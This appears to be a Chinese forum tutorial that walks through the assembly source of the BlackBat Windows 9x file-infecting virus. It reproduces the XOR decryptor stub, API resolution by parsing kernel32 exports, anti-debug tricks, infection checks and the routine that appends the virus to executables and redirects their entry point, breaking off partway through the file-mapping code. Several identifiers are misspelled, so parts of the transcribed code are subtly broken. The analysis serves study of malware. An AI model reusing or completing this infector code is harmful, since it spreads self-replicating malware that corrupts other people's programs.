
# BlackBat 学习之旅

> 原文：[`www.pediy.com/kssd/pediy12/126761.html`](https://www.pediy.com/kssd/pediy12/126761.html)

最近一直在研究病毒技术~~在这里给大家分析一个比较经典的病毒样例~~其实当你仔细研究过这个病毒之后，现在的很多病毒中都会用到其中的一些技术~~或是根据这个病毒改进而来的，Let's Go~~

```assembly
.386p

.model flat,stdcall

EXTRN ExitProcess:PROC        //这里就不多分析了，TASM 程序开头
```

接下来，又定义了如下一些数据，包括宏，数据结构和常量等~~

宏主要如下：

```assembly
@MESSAGE BOX MACRO szMessage

  IF DEBUG
    @DELTA  esi
    mov   eax,esi
    add   eax,offset szMessage
    call  esi + MessageBoxA,0,eax,eax,MB_OK OR MB_ICONINFORMATION
  ENDIF

endm

@DEFINE_API MACRO APIName

  sz&APIName  DB  '&APIName',0

  &APIName  DB  ?

endm

@DELTA MACRO Register

  LOCAL  GetIP

  call  GetIP

GetIP:

  pop  Register

  sub  Register,offset GetIP

endm

@OFFSET MACRO Register,Expression

  LOCAL  GetIP

  call  GetIP

GetIP:

  pop   Register

  add  Register,offset Expression - offset GetIP

endm

@GET API ADDRESS MACRO APIName

  push   ebx      ;保存 GetProcAddress 的地址

  push   ecx      ;保存 ImageBase

  mov   eax,esi

  add  eax,offset sz&APIName  ;API 地址

  call  ebx,ecx,eax    ;GetProcAddress

  pop   ecx      ;重置 ImageBase

  pop   ebx      ;重置 GetProcAddress 的地址

  mov   [esi + APIName],eax  ;保存 API 地址

endm

@TRY BEGIN MACRO Handler

  pushad         ;保存当前状态

  @OFFSET   esi,Handler    ;新的异常处理地址

  push     esi

  push    dword ptr fs:[0]  ;保存旧的异常处理

  mov    dword ptr fs:[0],esp  ;安装新的异常

endm

@TRY_EXCEPT MACRO Handler

  jmp NoException&Handler      ;如果没有异常发现，就跳转

Handler:

  mov   esp,[esp+8]      ;有异常发现就得到旧的 ESP 值

  pop   dword ptr fs:[0]    ;重置旧的异常处理

  add  esp,4

  popad

endm

@TRY_END MACRO Handler

  jmp  ExceptionHandled&Handler  ;跳到异常处理

NoException&Handler:

  pop   dword ptr fs:[0]

  add   esp,32 + 4

ExceptionHandled&Handler:

endm

@CALL  INT21h  MACRO Service

  mov   eax,Service      ;保存 Service 的值

  @DELTA  esi

  call  esi + VxDCall,VWIN32_Int21Dispatch,eax,ecx

endm
```

随后是一些数据常量

```assembly
PAGE_READWRITE      EQU  00000004h

IMAGE_READ_WRITE_EXECUTE  EQU  0E0000000h

IMAGE_SCN_WRITE_SHARED    EQU  10000000h  ;共享区域

IMAGE_FILE_DLL      EQU  2000h    ;文件类型是 DLL

FILE_MAP_ALL_ACCESS    EQU  000F001Fh

IMAGE_SIZEOF_NT_SIGNATURE  EQU  04h    ;PE00 = 0x00004550,4bytes

NULL        EQU  0

TRUE        EQU  1

FALSE       EQU  0

;File Access
GENERIC_READ       EQU   80000000h   ;只读

GENERIC_WRITE       EQU   40000000h   ;只写

FILE_SHARE_READ     EQU   00000001h   ;共享，写

FILE_SHARE_WRITE     EQU   00000002h   ;共享，读

INVALID_HANDLE_VALUE     EQU   -1

ERROR_ALREADY_EXISTS     EQU   000000B7h

FILE_ATTRIBUTE_NORMAL     EQU   00000080h

OPEN_EXISTING       EQU   3     ;文件没找到

;Shutdown Options
EWX_FORCE       EQU   4

EWX_SHUTDOWN      EQU   1

;MessageBox
MB_OK         EQU   00000000h

MB_YESNO       EQU   00000004h

MB_ICONINFORMATION    EQU   00000040h

;Virus_Constants
@BREAK        EQU   int 3

;MAX_RUN_TIME EQU 5*60*60*1000 ;Time we allow windows to run, 5hrs

VIRUS_SIGNATURE     EQU   08121975h   ;作者的生日

RESIDENCY_CHECK_SERVICE  EQU   0AD75h     ;检查病毒是否存在

RESIDENCY_SUCCESS     EQU   0812h     ;病毒存在

;VxD Stuff
VWIN32_Int21Dispatch     EQU   002A0010h

LFN_OPEN_FILE_EXTENDED     EQU   716Ch

PC_WRITEABLE      EQU   00020000h

PC_USER      EQU   00040000h

PR_SHARED      EQU   80060000h

PC_PRESENT      EQU   80000000h

PC_FIXED      EQU   00000008h

PD_ZEROINIT      EQU   00000001h

SHARED_MEMORY      EQU   80000000h   ;上面的所有一切都是共享的

PageReserve      EQU   00010000h

PageCommit      EQU   00010001h

PAGE_SIZE      EQU   4096     ;Win9x 页大小
```

最后是一些很重要的数据结构，相信这些数据结构大家会在很我场合用到过~~~其实就是 PE 结构，我就不详解了，不懂的看我以前的那个 PE 连载吧~~

```assembly
FILETIME STRUC                             ;定义文件时间结构体

  FT_dwLowDateTime   DD   ?

  FT_dwHighDateTime   DD   ?

FILETIME ENDS

IMAGE_DOS_HEADER STRUC

  IDH_e_magic     DW   ?

  IDH_e_cblp     DW   ?

  IDH_e_cp     DW   ?

  IDH_e_crlc     DW   ?

  IDH_e_cparhdr     DW   ?

  IDH_e_minalloc     DW   ?

  IDH_e_maxalloc     DW   ?

  IDH_e_ss     DW   ?

  IDH_e_sp     DW   ?

  IDH_e_csum     DW   ?

  IDH_e_ip     DW   ?

  IDH_e_cs     DW   ?

  IDH_e_lfarlc     DW   ?

  IDH_e_ovno     DW   ?

  IDH_e_res     DW   4 DUP (?)

  IDH_e_oemid     DW   ?

  IDH_e_oeminfo     DW   ?

  IDH_e_res2     DW   10 DUP (?)

  IDH_e_lfanew     DD   ?

IMAGE_DOS_HEADER ENDS

IMAGE_FILE_HEADER STRUC

  IFH_Machine     DW   ?

  IFH_NumberOfSections   DW   ?

  IFH_TimeDateStamp   DD   ?

  IFH_PointerToSymbolTable DD   ?

  IFH_NumberOfSymbols   DD   ?

  IFH_SizeOfOptionalHeader DW   ?

  IFH_Characteristics   DW   ?

IMAGE_FILE_HEADER ENDS

IMAGE_DATA_DIRECTORY STRUC

  IDD_VirtualAddress   DD   ?

  IDD_Size     DD   ?

IMAGE_DATA_DIRECTORY ENDS

IMAGE_OPTIONAL_HEADER STRUC

;Standard Fields

  IOH_Magic     DW   ?

  IOH_MajorLinkerVersion   DB   ?

  IOH_MinorLinkerVersion   DB   ?

  IOH_SizeOfCode     DD   ?

  IOH_SizeOfInitializedData DD   ?

  IOH_SizeOfUninitializedData DD   ?

  IOH_AddressOfEntryPoint DD   ?

  IOH_BaseOfCode     DD   ?

  IOH_BaseOfData     DD   ?

;NT Additional Fields

  IOH_ImageBase     DD   ?

  IOH_SectionAlignment   DD   ?

  IOH_FileAlignment   DD   ?

  IOH_MajorOperatingSystemVersion DW ?

  IOH_MinorOperatingSystemVersion DW ?

  IOH_MajorImageVersion   DW   ?

  IOH_MinorImageVersion   DW   ?

  IOH_MajorSubsystemVersion DW   ?

  IOH_MinorSubsystemVersion DW   ?

  IOH_Win32VersionValue   DD   ?

  IOH_SizeOfImage   DD   ?

  IOH_SizeOfHeaders   DD   ?

  IOH_CheckSum     DD   ?

  IOH_Subsystem     DW   ?

  IOH_DllCharacteristics   DW   ?

  IOH_SizeOfStackReserve   DD   ?

  IOH_SizeOfStackCommit   DD   ?

  IOH_SizeOfHeapReserve   DD   ?

  IOH_SizeOfHeapCommit   DD   ?

  IOH_LoaderFlags   DD   ?

  IOH_NumberOfRvaAndSizes DD   ?

  IOH_DataDirectory IMAGE_DATA_DIRECTORY 16 DUP (?)

IMAGE_OPTIONAL_HEADER ENDS

IMAGE_EXPORT_DIRECTORY STRUC

  IED_Characteristics   DD   ?

  IED_TimeDateStamp   DD   ?

  IED_MajorVersion   DW   ?

  IED_MinorVersion   DW   ?

  IED_Name     DD   ?

  IED_Base     DD   ?

  IED_NumberOfFunctions   DD   ?

  IED_NumberOfNames   DD   ?

  IED_AddressOfFunctions   DD   ?

  IED_AddressOfNames   DD   ?

  IED_AddressOfNameOrdinals DD   ?

IMAGE_EXPORT_DIRECTORY ENDS

IMAGE_SECTION_HEADER STRUC

  ISH_Name DB 8 DUP (?) ;NULL padded ASCII string

  UNION

    ISH_PhysicalAddress   DD   ?

    ISH_VirtualSize   DD   ?

  ENDS

  ISH_VirtualAddress   DD   ?

  ISH_SizeOfRawData   DD   ?

  ISH_PointerToRawData   DD   ?

  ISH_PointerToRelocations DD   ?

  ISH_PointerToLinenumbers DD ?

  ISH_NumberOfRelocations DW   ?

  ISH_NumberOfLinenumbers DW   ?

  ISH_Characteristics   DD   ?

IMAGE_SECTION_HEADER ENDS

SYSTEMTIME STRUC        ;系统时间结构体

  ST_wYear     DW   ?

  ST_wMonth     DW   ?

  ST_wDayOfWeek     DW   ?

  ST_wDay     DW   ?

  ST_wHour     DW   ?

  ST_wMinute     DW   ?

  ST_wSecond     DW   ?

  ST_wMilliseconds   DW   ?

SYSTEMTIME ENDS
```

好了上面的准备工作做完了，正式进入病毒体的分析阶段吧~~~

病毒的入口点代码如下：

```assembly
.code
```



### 入口代码

```asm
;Decryptor  

StartOfVirusCode:  

  call GetDelta  

GetDelta:                                      

  DB  5Eh    ;pop esi  

  DB  83h    ;add esi,EncryptedVirusCode - GetDelta  

  DB  0C6h   

  DB  offset EncryptedVirusCode - offset GetDelta  

  DB  0B9h    ;mov ecx,ENCRYPTED_SIZE(需要加密的长度) ------> $(代码结尾处)-offset EncryptedVirusCode  

  DD  ENCRYPTED_SIZE  

DecryptByte:  

  DB  80h    ;xor byte ptr [esi],00h(用 XOR 进行加密)  

  DB   36h     

EncryptionKey:  

  DB  00h  

  DB  46h    ;inc esi  

  DB  49h    ;dec ecx  

  jnz   DecryptBytes  

EncryptedVirusCode:    ;从这里代码将会被加密  

  jmp  WinMain    ;跳转到主程序处  
```

这段代码很经典，如果大家经常看一些病源代码，就会发现大部分病毒都是这样的（或有一些小的变化），可能这段代码已经被一些杀毒软件记录下来，作为特征码了。这里只是用机器码来取代汇编指令，其实你用 `OD` 进行调试的时候是一样的。

接下来，程序又在代码段中定义了一些数据：

```asm
;-----------------------------Data Area--------------------------------  

dwKernelBase    EQU  0BFF70000h  ;KERNE32.DLL 的基址  

dwUserBase    DD  ?    ;USER32.DLL 的基址  

szUser32DLL    DB  "USER32",0  ;不需要.DLL 的扩展名  

;Host File Variables   

hHostFile    DD  ?    ;主文件句柄  

hMappingFile    DD  ?    ;映射文件句柄  

lpHostFile    DD  ?    ;指向内存中文件映射  

ftLastAccessTime  FILETIME  ?  ;被后一些文件访问时间  

ftLastWriteTime    FILETIME  ?  ;最后一次文件写入时间  

;Virus Variables   

szNoInfectFileName  DB  "C:\\WIN.SYS",0  ;如果这个文件存在，就不进行感染  

;VxD Stuff  

OldInt30     DB  6 DUP(0)   

VxDCall_Busy    DD  ?    ;信号量  

szOutputFile    DB  "C:\\VIRUS.TXT",0  

;KERNEL32 API's  

VxDCall     DD  ?    ;输出表序号  

@DEFINE_API    GetProcAddress  

@DEFINE_API    CloseHandle   

@DEFINE_API    CreateFileA  

@DEFINE_API    CreateFileMappingA  

@DEFINE_API    GetFileAttributesA  

@DEFINE_API    GetFileSize  

@DEFINE_API    GetFileTime  

@DEFINE_API    GetTickCount  

@DEFINE_API    LoadLibraryA  

@DEFINT_API    MapViewOfFile  

@DEFINE_API    SetFileAttributesA  

@DEFINE_API    SetFileTime  

@DEFINE_API    UnmapViewOfFile  

;USER32 API's  

  @DEFINE_API    ExitWindnowsEx  

  IF  DEBUG  

    @DEFINE_API  MessageBoxA  

  ENDIF  

;DEBUG Only Stuff  

  IF  DEBUG  

    szHostFileName    DB  'NOTEPAD.EXE',0  

    szWinMainHandler  DB  'UnHandled Exception in WinMain',0  

    szPayLoad    DB  'Happy BirthDay',0  

    szInfected    DB  'This File is Infected by the BlackBat Virus',0  

  ENDIF  
```

入口代码讲完了，我们进入主题吧。前面的代码末尾用一个 `JMP` 语句跳到我们的主程序段中。

### 主程序逻辑

```asm
;-------------WinMain----------------  

WinMain  PROC  

  IF   DEBUG                   ;如果程序正在被单步调试，将会出现一些异常情况，一种简单的反调试技巧  

    cli  

    not esp  

    not esp  

    sti  

  ENDIF                        

  

  @TRY_BEGIN  WinMain_Handler        ;这里调用前面的宏进行 SEH 异常处理的安装  

(1)    call  IsVirusActive          
  
    test  eax,eax  

    jne  End_WinMain  

  ;Get Addresses of all Required API's  

(2)  call  GetAPIAddresses      ;得到其它 API 函数的地址  

  test  eax,eax        ;函数返回值  

  jz  WinMain        ;循环  

  IF  DEBUG  

    @MESSAGE_BOX   szInfected  

    @OFFSET    ebx,szHostFileName  

(3)    call    InfectFile,ebx  

  ENDIF  

  ;Check if this Machine is to be Infected  

(4)  call  CanMachineBeInfected    ;判断是否感染这台机器  

  test  eax,eax   

  jz  End_WinMain      ;不感染  

  ;Relocate Virus (Make Resident)  

(5)  call  RelocateVirus      
  
  test  eax,eax        ;病毒是否已重定位  

  je   End_WinMain  

  ;Jump to Relocated Virus Copy  

  @OFFSET  ebx,StartOfVirusCode    ;从没有重定位地方开始拷贝  

  add   eax,offset RelocatedVirus - offset StartOfVirusCode  

  jmp   eax        ;跳转到重定位处  

  ;在共享内存中拷贝重定位代码  

RelocatedVirus:  

  @DELTA  eax  

  mov  esi,eax        ;保存 Delta 地址偏移  

  add  eax,offset StartOfVirusCode  ;从病毒的重定位开始  

  sub   eax,ebx        ;相差的偏移量  

  ;下面主要是为了让病毒能在正确的内存位置处进行执行  

  add  esi,offset ReturnToHost + 1  ;指向 JMP 操作  

  sub   [esi],eax      ;修改 JMP 指令  

(6)  call  InstallHookProcedure  

End_WinMain:  

  @TRY_EXCEPT WinMain_Handler  

    @MESSAGE_BOX  szWinMainHandler  

  @TRY_EXCEPT  WinMain_Handler  

ReturnToHost:  

  DB  0E9h,00,00,00,00    ;这里是一种很常见的 HOOK API 技术了，使用 JMP 指令进行跳转  

WinMain endp  
```

接下来，我将以主程序为一条主线，进行讲解。上面我标出了主程序中使用的六个函数，我们来重点分析这几个函数都在做些什么工作。

**(1) `IsVirusActive` 用于判断病毒在内存中的状态**

```asm
IsVirusActive   PROC  

(*)  call   GetAddressOfKernelAPI, 0           ;调用 GetAddressOfKernelAPI 得到 VxDCall 的 API 地址   

  test   eax, eax                      
  
  jz   End_IsVirusActive          ;如果函数调用失败就直接返回           
  
  @OFFSET ebx, VxDCall            ;成功，则保存 VxDCall API 地址          
  
  mov   [ebx], eax                   
  
  @CALL_INT21h RESIDENCY_CHECK_SERVICE      ;调用前面定义的宏，检查是否已经被感染了  

  xor   eax, eax                   
  
  cmp   esi, RESIDENCY_SUCCESS                  
  
  jne   End_IsVirusActive      ;如果已经被感染了，也直接返回           
  
  inc   eax                 
  
End_IsVirusActive:  

  ret  

IsVirusActive ENDP  
```

这里又调用了一个函数（`(*)` 处），我们在跟进去看看。

**`GetAddressOfKernelAPI` 用于获取内核 API 地址**

```asm
GetAddressOfKernelAPI PROC gaoka wAPIName:DWORD  

  local   lpdwAddressOfFunctions:DWORD  

  local   lpdwAddressOfNames:DWORD  

  local   lpwAddressOfNameOrdinals:DWORD  

  local   dwVAIEd:DWORD  

;得到文件头  

(*)  call   GetFileHeaders,dwKernelBase            ;调用 GetFileHeaders 得到文件头  

  test  eax,eax       ;成功，则保存文件头  

  je   End_GetAddressOfKernelAPI    ;不成功，则直接返回  

  mov   [dwVAIED],edx        ;保存文件头  

  mov   esi,dwKernelBase                ;将前面定义的 kernel32.dll 基地址传给 esi  

;得到函数地址  

  mov   ecx,[dwVAIED]  

  mov   eax,(IMAGE_EXPORT_DIRECTORY[ecx]).IED_AddressOfFunctions  

  add  eax,esi        ;得到函数的虚拟地址  

  mov   dword ptr [lpdwAddressOfFunctions],eax  

;查找那些需要的 API 函数  

  cmp  [gaoka_wAPIName],0      ;返回 VxDCall 或 GetProcAddress 地址  

  jne  GetProcAddressRequired      ;如果是需要的函数 API，则跳转到 GetProcAddress  

;通过索引来得到函数地址  

  xor   eax,eax  

  inc  eax           ;索引号  

  sub  eax,(IMAGE_EXPORT_DIRECTORY [ecx]).IED_Base        ;索引号是否在指定范围内  

  jmp  GetAddressFromIndex          
  
GetProcAddressRequired:  

;得到函数的名称  

  mov   ecx, [dwVAIED]  

  mov   eax, (IMAGE_EXPORT_DIRECTORY [ecx]).IED_AddressOfNames  

  add   eax, esi          ;得到函数的虚拟地址  

  mov   dword ptr [lpdwAddressOfNames], eax  

;得到函数地址  

  mov   ecx, [dwVAIED]  

  mov   eax, (IMAGE_EXPORT_DIRECTORY [ecx]).IED_AddressOfNameOrdinals  

  add   eax, esi          ;函数的地址  

  mov   dword ptr [lpwAddressOfNameOrdinals], eax  

;在名称地址数组中查找 API  

  push   esi        ;保存 kernel32.dll 基址  

  mov   eax, esi      ;保存在 EAX 中  

  xor   ebx, ebx  

  dec   ebx       ;初始化索引减一  

  mov   edx, dword ptr [lpdwAddressOfNames]  

  @OFFSET esi, szGetProcAddress   ;如果找到  

  mov   ecx, esi      ;保存地址在 ECX 中  

CheckNextAPI:  

  inc   ebx       ;增加索引  

  mov   edi, dword ptr [edx + ebx*4]      ;通过索引得到函数地址  

  add   edi, eax      ;得到虚拟地址  

  mov   esi, ecx      ;得到前面那个函数的地址  

CheckNextByte:  

  cmpsb        ;检查字符串  

  jne   CheckNextAPI      ;如果不与需要的 API 相同，就继续查找下一个字符  

  cmp   byte ptr [edi], 0   ;是否到达了函数表的未尾  

  je   FoundAPI      ;是否找到了 API  

  jmp   CheckNextByte      ;没有，就继续下一个吧  

FoundAPI:  

  pop   esi         
  
;Compute the Index  

  mov   ecx, ebx  

  mov   edx, dword ptr [lpwAddressOfNameOrdinals]  

  movzx   eax, word ptr [edx + ecx*2]      ;函数的索引  

;Get the Address (EAX = Index, ESI = Kernel32 Base)  

GetAddressFromIndex:  

  mov   ebx, [lpdwAddressOfFunctions]  

  mov   eax, dword ptr [ebx + eax*4]      ;API 的相对虚拟地址  

  add   eax, esi      ;API 的虚拟地址  

End_GetAddressOfKernelAPI:  

  ret  

GetAddressOfKernelAPI ENDP  
```

这个函数里面又调用了一个新的函数 `GetFileHeaders` 得到文件头。

**`GetFileHeaders` 用于获取文件头信息**

```asm
GetFileHeaders   PROC   gfh_dwFileBase:DWORD  

  LOCAL   dwIOH:DWORD, \  
    dwIED:DWORD, \  

  mov   esi, [gfh_dwFileBase]  

  cmp   word ptr [esi], "ZM"             ;比较是 EXE 还是 DLL  
```



### `GetFileHeaders` 函数分析

以下代码用于解析 PE 文件头并获取关键结构偏移：

```asm
  jne   Error_GetFileHeaders          
  
;Check for PE Signature
  
  add   esi, (IMAGE_DOS_HEADER [esi]).IDH_e_lfanew  
  cmp   dword ptr [esi], "EP"           ;是否是 PE 文件  
  jne   Error_GetFileHeaders          
  
;Get Image Optional Header  
  add   esi, IMAGE_SIZEOF_NT_SIGNATURE      ;文件头映像  
  push  esi           ;保存文件头映像  
  add   esi, SIZE IMAGE_FILE_HEADER      ;可选头映像  
  mov   [dwIOH], esi        ;保存可选头映像  

;Get the Address of the Image Export Directory  
  mov   esi, (IMAGE_OPTIONAL_HEADER [esi]).IOH_DataDirectory(0).IDD_VirtualAddress   ;得到输出表的映像地址  

Export Directory  
  add   esi, [gfh_dwFileBase]  
  mov   dword ptr [dwIED], esi  

;Get Address of Last Section Header  
  pop   esi           ;得到文件头的大小  
  movzx ecx, (IMAGE_FILE_HEADER [esi]).IFH_SizeOfOptionalHeader  
  add   ecx, [dwIOH]        ;得到第一个区块大小  
  movzx eax, (IMAGE_FILE_HEADER [esi]).IFH_NumberOfSections  
  dec   eax           ;区块数减 1  
  imul  eax, eax, SIZE IMAGE_SECTION_HEADER       ;所有区块头总和  
  ;mov ebx, SIZE IMAGE_SECTION_HEADER  
  ;mul ebx ;Size of All Section Headers  
  add ecx, eax ;Address of Last Section Header  
  ;Return Header Values  
  mov eax, esi           ;文件头映像  
  mov ebx, [dwIOH]  
  mov edx, [dwIED]  
  jmp End_GetFileHeaders  

Error_GetFileHeaders:  
  xor eax, eax ;Error, Return 0  

End_GetFileHeaders:  
  ret  

GetFileHeaders ENDP  
```

(1) 我们就分析完成了，接着看 (2) 得到所有需要的 API 函数地址

### `GetAPIAddresses` 函数分析

以下代码获取 Windows API 函数的地址：

```asm
GetAPIAddresses PROC  
(*)  call  GetAddressOfKernelAPI,1    ;通过 GetAddressOfKernelAPI 函数，得到 GetProcAddress 的地址  
  test  eax,eax         
  jz    End_GetAPIAddresses    ;是否得到，如是没有得到，则直接返回  
  ;得到所有需要的 API 函数地址  
  ;ESI = Delta 的偏移  
  ;EBX = GetProcAddress 函数地址  
  ;ECX = kerne32.dll 的基址  
  @DELTA  esi         
  mov  ebx,eax  
  mov  ecx,dwKernelBase  
  @GET_API_ADDRESS  CloseHandle  
  @GET_API_ADDRESS  CreateFileA  
  @GET_API_ADDRESS  CreateFileMappingA  
  @GET_API_ADDRESS  GetFileAttributesA  
  @GET_API_ADDRESS  GetFileSize  
  @GET_API_ADDRESS  GetFileTime  
  @GET_API_ADDRESS  GetLocalTime  
  @GET_API_ADDRESS  GetTickCount  
  @GET_API_ADDRESS  LocaLibraryA  
  @GET_API_ADDRESS  MapViewOfFile  
  @GET_API_ADDRESS  SetFileAttributesA  
  @GET_API_ADDRESS  SetFileTime  
  @GET_API_ADDRESS  UnmapViewOfFile  

;加载 User32.dll  
  push  ebx     ;保存 GetProcAddress 函数地址  
  mov  eax,esi     ;Delta 偏移  
  add   eax,offset szUser32Dll  ;user32.DLL 被加载  
  call  esi + LoadLibraryA,eax   
  mov   ecx,eax     ;user32.dll 基址  
  pop   ebx     ;重置 GetProcAddress 函数地址  
  ;得到所有需要的 API 函数地址  
  ;ESI = Delta 的偏移  
  ;EBX = GetProcAddress 函数地址  
  ;ECX = user32.dll 的基址  
  @GET_API_ADDRESS ExitWindowsEx  ;调用宏得到 ExitWindowsEx 的地址  
  IF DEBUG  
    @GET_API_ADDRESS  MessageBoxA  ;调用宏得到 MessageBoxA 的地址  
  ENDIF  

End_GetAPIAddresses:  
  ret  

GetAPIAddresses endp  
```

这个函数比较简单，就是得到我们需要用到的 API 函数的地址即可。再来看 (3)，这个函数是程序的关键，即感染文件函数。

### `InfectFile` 函数分析

以下代码执行感染文件的核心逻辑：

```asm
InfectFile   PROC if_szFileName:DWORD  
  LOCAL lpdwLastSection:DWORD, \
    dwVirusBegin:DWORD, \
    dwNewEntryRVA:DWORD, \
    dwJumpBytes:DWORD, \
    dwIOH:DWORD, \
    dwIncFileSize:DWORD, \
    dwIncSecSize:DWORD, \
    dwDeltaOffset:DWORD  

  @DELTA esi  
  mov   [dwDeltaOffset], esi        ;保存 Delta 偏移量  

;检查文件是否已经被感染  
(*)  call   CanFileBeInfected, if_szFileName  
  test   eax, eax          
  jz    End_InfectFile         ;如果被感染了，直接返回  
  mov   [dwIncFileSize], ebx       ;保存增加的文件大小  
  mov   [dwIncSecSize], ecx       ;保存增加的区块大小  

;Map Host File into Memory  
(*)  call   OpenAndMapFile, if_szFileName, dwIncFileSize  
  test   eax, eax         ;文件打开，映射是否成功  
  jz    End_InfectFile         ;如果没有成功，则直接返回  
  mov   esi, [dwDeltaOffset]  
  mov   [esi + lpHostFile], eax     ;保存文件开始地址  

;Get File Headers  
(*)  call   GetFileHeaders, eax       ;得到文件头  
  mov   [dwIOH], bx          
  mov   [lpdwLastSection], ecx  

;计算病毒代码在文件开始位置  
  mov   eax, (IMAGE_SECTION_HEADER [ecx]).ISH_PointerToRawData  
  add   eax, (IMAGE_SECTION_HEADER [ecx]).ISH_SizeOfRawData  
  mov   [dwVirusBegin], eax       ;文件新的入口点相对位置  

;计算新的入口点的相对虚拟地址  
  mov   ebx, [lpdwLastSection]  
  sub   eax, (IMAGE_SECTION_HEADER [ebx]).ISH_PointerToRawData  
  add   eax, (IMAGE_SECTION_HEADER [ebx]).ISH_VirtualAddress  
  mov   [dwNewEntryRVA], eax  

;计算 JMP 指令字节数  
  add   eax, offset ReturnToHost - offset StartOfVirusCode  
  mov   ebx, [dwIOH]  
  sub   eax, (IMAGE_OPTIONAL_HEADER [ebx]).IOH_AddressOfEntryPoint  
  add   eax, 4  
  not   eax  
  mov   [dwJumpBytes], eax       ;保存这个字节数  

;在主程序中增加病毒部分  
  mov   esi, offset StartOfVirusCode     ;拷贝病毒  
  add   esi, [dwDeltaOffset]           
  mov   edi, [dwVirusBegin]           
  mov   ebx, [dwDeltaOffset]  
  add   edi, [ebx + lpHostFile]     ;拷贝地址  
  mov   ecx, VIRUS_SIZE  
  rep   movsb  

;写入新的 JMP 指令  
;Offset in File where operand to JMP instruction is to be put  
  mov   ebx, offset ReturnToHost + 1 - offset StartOfVirusCode  
  add   ebx, [dwVirusBegin]       ;文件中的偏移地址  
  mov   esi, [dwDeltaOffset]  
  add   ebx, [esi + lpHostFile]     ;校正映射文件的偏移  
  mov   ecx, [dwJumpBytes]          
  mov   [ebx], ecx          

;更新最后一个区块  
  mov   eax, [lpdwLastSection]  
  mov   ebx, [dwIncSecSize]  
  mov   ecx, [dwIncFileSize]  
  add   (IMAGE_SECTION_HEADER [eax]).ISH_SizeOfRawData, ecx  
  add   (IMAGE_SECTION_HEADER [eax]).ISH_VirtualSize, ebx  
  or    (IMAGE_SECTION_HEADER [eax]).ISH_Characteristics, IMAGE_READ_WRITE_EXECUTE  

;为文件计算虚拟大小  
  mov   ebx, (IMAGE_SECTION_HEADER [eax]).ISH_SizeOfRawData  
  cmp   (IMAGE_SECTION_HEADER [eax]).ISH_VirtualSize, ebx        
  jge   VirtualSizeFine ;No, Fix Not Required  
  mov   (IMAGE_SECTION_HEADER [eax]).ISH_VirtualSize, ebx        

VirtualSizeFine:  

;更新 PE 头  
  mov   ebx, [dwIOH] ;Address of Image Optional Header  
  add   (IMAGE_OPTIONAL_HEADER [ebx]).IOH_SizeOfImage, ecx  

;更新 PE 头的相对虚拟地址  
  mov   ecx, [dwNewEntryRVA]     ;得到新入口的 RVA  
  mov   (IMAGE_OPTIONAL_HEADER [ebx]).IOH_AddressOfEntryPoint, ecx  

;Update the Win32VersionValue field. This is used as a Virus Signature  
  mov   (IMAGE_OPTIONAL_HEADER [ebx]).IOH_Win32VersionValue, VIRUS_SIGNATURE  

;Encrypt the file, and Close it  
  mov   ebx, [dwDeltaOffset]  
  mov   edi, [ebx + lpHostFile]     ;主程序的开始地址  
  add   edi, [dwVirusBegin]       ;病毒在文件中的地址  
(*)  call   EncryptVirus     ;加密病毒体  
(*)  call   UnmapAndCloseFile, if_szFileName  
  xor   eax, eax  
  inc eax           ;如果成功，返回 1  

End_InfectFile:  
  ret  

InfectFile ENDP  
```

这个函数里面有几个函数，我们一一分析开来，重复的就不分析了。

(*) `CanFileBeInfected` 这个函数主要是用来检查文件是否被感染~~检查的主要依据：

1. 文件必须是 `EXE` 文件  
2. 文件头须是 `PE`  
3. 不能是 `DLL` 文件  
4. 是否是被我们的病毒感染  
5. 不能是自 `WinZip` 类的自解压文件  

以下代码实现 `CanFileBeInfected` 函数的逻辑：

```asm
CanFileBeInfected   PROC   cfbe_szFileName:DWORD  

;映射文件，但不增加文件大小  
(*)  call   OpenAndMapFile, cfbe_szFileName, 0  
  test   eax, eax          ;文件打开映射成功是否成功  
  jz    End_CanFileBeInfected         

;得到文件头  
(*)  call   GetFileHeaders, eax  
  test   eax, eax             
  je    End_CanFileBeInfected         

;检查文件是否被感染  
  cmp   (IMAGE_OPTIONAL_HEADER [ebx]).IOH_Win32VersionValue, VIRUS_SIGNATURE  
  jz    Error_CanFileBeInfected ;File is already infected  

;检查文件是否是 DLL 文件  
  test   (IMAGE_FILE_HEADER [eax]).IFH_Characteristics, IMAGE_FILE_DLL  
  jnz   Error_CanFileBeInfected ;Yes  
```



```asm
  cmp   dword ptr (IMAGE_SECTION_HEADER [ecx]).ISH_Name, "niw\_"       ;是不是_win  

  je   Error_CanFileBeInfected                 ;是的，就不感染  

  mov   eax, ebx                     ;可选头映像  

  mov   ebx, (IMAGE_OPTIONAL_HEADER [eax]).IOH_FileAlignment  

  mov   ecx, (IMAGE_OPTIONAL_HEADER [eax]).IOH_SectionAlignment  

;计算要增加的区块长度  

;INC_SEC_SIZE = [(VIRUS_SIZE - 1 + SECTION_ALIGN) / SECTION_ALIGN] * SECTION_ALIGN               ; 这个公式在很多写病毒的场合用于，哈哈  

  mov   eax, VIRUS_SIZE - 1                    ;增加区块  

  add   eax, ecx                       
  
  xor   edx, edx                      
  
  div   ecx                     
  
  mul   ecx                      
  
  push   eax                      
  
;计算文件增加大小  

;INC_FILE_SIZE = (INC_SEC_SIZE - 1 + FILE_ALIGN) / FILE_ALIGN] * FILE_ALIGN  

  mov   eax, VIRUS_SIZE - 1  

  add   eax, ebx                    
  
  div   ebx                     
  
  mul   ebx                     
  
  push   eax                      
  
;关闭文件句柄，并返回相关值  

(*)  call   UnmapAndCloseFile, cfbe_szFileName  

  pop   ebx                      
  
  pop  ecx                      
  
  xor   eax, eax  

  inc   eax                      
  
  jmp   End_CanFileBeInfected  

Error_CanFileBeInfected:  

(*)  call   UnmapAndCloseFile, cfbe_szFileName  

  xor   eax, eax                    

End_CanFileBeInfected:  

  ret  

CanFileBeInfected ENDP  
```

回到 `InfectFile` 函数里面，它还调用了一个打开文件句柄的函数

```asm
OpenAndMapFile PROC oamf_szFileName:DWORD, oamf_dwAddBytes:DWORD  

  @DELTA   esi  

                  ;保存文件属性  

  call   esi + GetFileAttributesA, oamf_szFileName  

  mov   [esi + dwFileAttributes], eax          ;保存文件属生  

  call   esi + SetFileAttributesA, oamf_szFileName, FILE_ATTRIBUTE_NORMAL  

  test   eax, eax            ;设置文件属性是否成功  

  je   End_OpenAndMapFile          

;以读写方式打开文件  

  call   esi + CreateFileA, oamf_szFileName, GENERIC_READ OR GENERIC_WRITE, \  

     FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL  

  cmp   eax, INVALID_HANDLE_VALUE          ;文件打开是否成功  

  je   Error_OpenAndMapFile_Create          

